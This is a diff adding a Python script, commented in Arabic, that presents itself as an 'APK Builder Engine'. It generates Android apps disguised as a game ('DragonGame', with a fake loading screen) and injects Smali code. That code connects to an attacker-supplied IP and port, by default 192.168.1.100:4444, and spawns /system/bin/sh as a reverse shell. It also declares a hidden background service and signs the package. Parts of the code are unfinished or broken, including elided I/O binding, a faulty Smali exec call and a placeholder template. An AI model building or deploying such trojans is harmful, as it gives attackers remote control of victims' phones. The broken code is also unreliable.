@@ -1,0 +1,367 @@
+#!/usr/bin/env python3
+"""
+APK Builder Engine - محرك بناء التطبيقات
+يقوم ببناء APK مع Reverse Shell تلقائياً
+"""
+
+import os
+import shutil
+import subprocess
+import tempfile
+import zipfile
+import xml.etree.ElementTree as ET
+from datetime import datetime
+
+class APKBuilder:
+    def __init__(self):
+        self.template_dir = "builder_engine/templates/base_app"
+        self.output_dir = "payloads"
+        self.keystore_path = "builder_engine/keystore.jks"
+        self.keystore_password = "android123"
+        
+        # إنشاء المجلدات إذا لم تكن موجودة
+        os.makedirs(self.output_dir, exist_ok=True)
+        
+    def build_reverse_shell(self, target_ip, target_port, app_name="GameApp", icon_type="default"):
+        """بناء APK مع Reverse Shell"""
+        
+        print(f"[+] بناء APK لـ {target_ip}:{target_port}")
+        
+        # 1. إنشاء مجلد عمل مؤقت
+        temp_dir = tempfile.mkdtemp(prefix="apk_build_")
+        print(f"[+] مجلد العمل: {temp_dir}")
+        
+        try:
+            # 2. نسخ القالب
+            template_path = os.path.join(self.template_dir, "base.apk")
+            if not os.path.exists(template_path):
+                self._create_base_template()
+                
+            shutil.copy(template_path, os.path.join(temp_dir, "app.apk"))
+            
+            # 3. فك ضغط الـ APK
+            self._extract_apk(temp_dir)
+            
+            # 4. تعديل AndroidManifest.xml
+            self._modify_manifest(temp_dir, app_name)
+            
+            # 5. حقن كود Reverse Shell
+            self._inject_reverse_shell(temp_dir, target_ip, target_port)
+            
+            # 6. إعادة ضغط الـ APK
+            self._repack_apk(temp_dir)
+            
+            # 7. توقيع الـ APK
+            apk_path = self._sign_apk(temp_dir, app_name)
+            
+            # 8. تنظيف
+            shutil.rmtree(temp_dir)
+            
+            print(f"[+] تم بناء APK: {apk_path}")
+            return apk_path
+            
+        except Exception as e:
+            print(f"[-] خطأ في بناء APK: {e}")
+            if os.path.exists(temp_dir):
+                shutil.rmtree(temp_dir)
+            raise
+    
+    def _extract_apk(self, temp_dir):
+        """فك ضغط APK"""
+        apk_path = os.path.join(temp_dir, "app.apk")
+        extract_dir = os.path.join(temp_dir, "extracted")
+        
+        with zipfile.ZipFile(apk_path, 'r') as zip_ref:
+            zip_ref.extractall(extract_dir)
+    
+    def _modify_manifest(self, temp_dir, app_name):
+        """تعديل AndroidManifest.xml"""
+        manifest_path = os.path.join(temp_dir, "extracted", "AndroidManifest.xml")
+        
+        # تحويل XML الثنائي إلى نص (في الواقع الحقيقي تحتاج apktool)
+        # هنا نموذج مبسط للفكرة
+        
+        # إنشاء ملف Manifest جديد
+        manifest_content = f"""<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.{app_name.lower()}.app">
+
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="{app_name}"
+        android:theme="@style/AppTheme">
+        
+        <activity android:name=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        
+        <!-- خدمة خفية تعمل في الخلفية -->
+        <service
+            android:name=".BackgroundService"
+            android:enabled="true"
+            android:exported="false" />
+            
+    </application>
+</manifest>"""
+        
+        with open(manifest_path, 'w', encoding='utf-8') as f:
+            f.write(manifest_content)
+    
+    def _inject_reverse_shell(self, temp_dir, target_ip, target_port):
+        """حقن كود Reverse Shell في التطبيق"""
+        
+        # مسار ملفات Java/Smali
+        smali_dir = os.path.join(temp_dir, "extracted", "smali", "com", "example", "app")
+        os.makedirs(smali_dir, exist_ok=True)
+        
+        # كود Reverse Shell في Smali (لغة تجميع Android)
+        reverse_shell_code = f""".class public Lcom/example/app/MainActivity;
+.super Landroid/app/Activity;
+
+.method protected onCreate(Landroid/os/Bundle;)V
+    .locals 3
+    
+    invoke-super {{p0, p1}}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
+    
+    # تعيين واجهة المستخدم
+    const v0, 0x7f040001
+    invoke-virtual {{p0, v0}}, Lcom/example/app/MainActivity;->setContentView(I)V
+    
+    # بدء Reverse Shell في Thread منفصل
+    new-instance v0, Ljava/lang/Thread;
+    
+    new-instance v1, Lcom/example/app/MainActivity$1;
+    invoke-direct {{v1, p0}}, Lcom/example/app/MainActivity$1;-><init>(Lcom/example/app/MainActivity;)V
+    
+    invoke-direct {{v0, v1}}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
+    
+    invoke-virtual {{v0}}, Ljava/lang/Thread;->start()V
+    
+    return-void
+.end method
+
+# فئة داخلية للـ Reverse Shell
+.class Lcom/example/app/MainActivity$1;
+.super Ljava/lang/Object;
+.implements Ljava/lang/Runnable;
+
+.field final synthetic this$0:Lcom/example/app/MainActivity;
+
+.method constructor <init>(Lcom/example/app/MainActivity;)V
+    .locals 0
+    
+    iput-object p1, p0, Lcom/example/app/MainActivity$1;->this$0:Lcom/example/app/MainActivity;
+    
+    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
+    
+    return-void
+.end method
+
+.method public run()V
+    .locals 6
+    
+    .catch Ljava/lang/Exception; {{:L_start}}
+    
+    :L_start
+    # انتظار 5 ثواني
+    const-wide/32 v0, 0x1388
+    invoke-static {{v0, v1}}, Ljava/lang/Thread;->sleep(J)V
+    
+    # معلومات الاتصال
+    const-string v0, "{target_ip}"
+    const/16 v1, {target_port}
+    
+    # محاولة الاتصال
+    new-instance v2, Ljava/net/Socket;
+    invoke-static {{v0}}, Ljava/net/InetAddress;->getByName(Ljava/lang/String;)Ljava/net/InetAddress;
+    
+    move-result-object v0
+    invoke-direct {{v2, v0, v1}}, Ljava/net/Socket;-><init>(Ljava/net/InetAddress;I)V
+    
+    # فتح shell
+    const-string v0, "/system/bin/sh"
+    invoke-static {{v0}}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
+    
+    move-result-object v0
+    invoke-virtual {{v0, v0}}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
+    
+    move-result-object v0
+    
+    # ربط الـ I/O
+    # ... (كود كامل للربط)
+    
+    return-void
+    
+    :L_catch
+    move-exception v0
+    # تجاهل الأخطاء
+    return-void
+.end method
+"""
+        
+        # حفظ كود Reverse Shell
+        main_activity_path = os.path.join(smali_dir, "MainActivity.smali")
+        with open(main_activity_path, 'w', encoding='utf-8') as f:
+            f.write(reverse_shell_code)
+        
+        # إنشاء ملفات أخرى ضرورية
+        self._create_supporting_files(temp_dir)
+    
+    def _create_supporting_files(self, temp_dir):
+        """إنشاء ملفات داعمة للتطبيق"""
+        # إنشاء مجلدات التخطيط
+        layout_dir = os.path.join(temp_dir, "extracted", "res", "layout")
+        os.makedirs(layout_dir, exist_ok=True)
+        
+        # ملف activity_main.xml
+        layout_content = """<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:orientation="vertical"
+    android:gravity="center"
+    android:background="#1a1a2e">
+    
+    <ImageView
+        android:layout_width="120dp"
+        android:layout_height="120dp"
+        android:src="@drawable/ic_game"
+        android:layout_marginBottom="30dp"/>
+    
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="جاري تحميل اللعبة..."
+        android:textColor="#FFFFFF"
+        android:textSize="24sp"
+        android:layout_marginBottom="20dp"/>
+    
+    <ProgressBar
+        android:layout_width="200dp"
+        android:layout_height="wrap_content"
+        android:indeterminate="true"
+        android:progressTint="#4CAF50"/>
+    
+    <Button
+        android:id="@+id/btn_start"
+        android:layout_width="200dp"
+        android:layout_height="60dp"
+        android:text="ابدأ اللعب"
+        android:layout_marginTop="40dp"
+        android:background="#4CAF50"
+        android:textColor="#FFFFFF"
+        android:textSize="18sp"/>
+    
+</LinearLayout>"""
+        
+        with open(os.path.join(layout_dir, "activity_main.xml"), 'w', encoding='utf-8') as f:
+            f.write(layout_content)
+    
+    def _repack_apk(self, temp_dir):
+        """إعادة ضغط APK"""
+        extracted_dir = os.path.join(temp_dir, "extracted")
+        apk_path = os.path.join(temp_dir, "unsigned.apk")
+        
+        # إنشاء ملف ZIP جديد
+        with zipfile.ZipFile(apk_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for root, dirs, files in os.walk(extracted_dir):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    arcname = os.path.relpath(file_path, extracted_dir)
+                    zipf.write(file_path, arcname)
+    
+    def _sign_apk(self, temp_dir, app_name):
+        """توقيع APK"""
+        unsigned_path = os.path.join(temp_dir, "unsigned.apk")
+        signed_path = os.path.join(self.output_dir, f"{app_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.apk")
+        
+        # إنشاء keystore إذا لم يكن موجوداً
+        if not os.path.exists(self.keystore_path):
+            self._create_keystore()
+        
+        # توقيع الـ APK باستخدام jarsigner
+        cmd = [
+            "jarsigner",
+            "-verbose",
+            "-sigalg", "SHA1withRSA",
+            "-digestalg", "SHA1",
+            "-keystore", self.keystore_path,
+            "-storepass", self.keystore_password,
+            "-keypass", self.keystore_password,
+            unsigned_path,
+            "androidkey"
+        ]
+        
+        try:
+            subprocess.run(cmd, check=True, capture_output=True)
+            
+            # استخدام zipalign لتحسين الـ APK
+            aligned_path = os.path.join(temp_dir, "aligned.apk")
+            zipalign_cmd = ["zipalign", "-v", "4", unsigned_path, aligned_path]
+            subprocess.run(zipalign_cmd, check=True, capture_output=True)
+            
+            shutil.copy(aligned_path, signed_path)
+            
+        except subprocess.CalledProcessError as e:
+            print(f"[-] خطأ في توقيع APK: {e}")
+            # إذا فشل التوقيع، استخدم النسخة غير الموقعة
+            shutil.copy(unsigned_path, signed_path)
+        
+        return signed_path
+    
+    def _create_keystore(self):
+        """إنشاء keystore للتوقيع"""
+        print("[+] إنشاء keystore جديد...")
+        cmd = [
+            "keytool",
+            "-genkey",
+            "-v",
+            "-keystore", self.keystore_path,
+            "-alias", "androidkey",
+            "-keyalg", "RSA",
+            "-keysize", "2048",
+            "-validity", "10000",
+            "-storepass", self.keystore_password,
+            "-keypass", self.keystore_password,
+            "-dname", "CN=Android, OU=Android, O=Android, L=Android, S=Android, C=US"
+        ]
+        
+        try:
+            subprocess.run(cmd, check=True, input=b"\n\n\n\n\n\n\n", capture_output=True)
+            print("[+] تم إنشاء keystore بنجاح")
+        except Exception as e:
+            print(f"[-] خطأ في إنشاء keystore: {e}")
+    
+    def _create_base_template(self):
+        """إنشاء قالب APK أساسي إذا لم يوجد"""
+        print("[+] إنشاء قالب APK أساسي...")
+        # في الإصدار الكامل، ننشئ تطبيق Android Studio أساسي
+        # هنا مجرد ملف وهمي للتوضيح
+        template_path = os.path.join(self.template_dir, "base.apk")
+        os.makedirs(self.template_dir, exist_ok=True)
+        
+        with open(template_path, 'wb') as f:
+            f.write(b"APK template placeholder")
+        
+        print("[+] تم إنشاء القالب الأساسي")
+
+# دالة مساعدة لاختبار المحرك
+if __name__ == "__main__":
+    builder = APKBuilder()
+    apk = builder.build_reverse_shell(
+        target_ip="192.168.1.100",
+        target_port=4444,
+        app_name="DragonGame"
+    )
+    print(f"APK جاهز: {apk}")
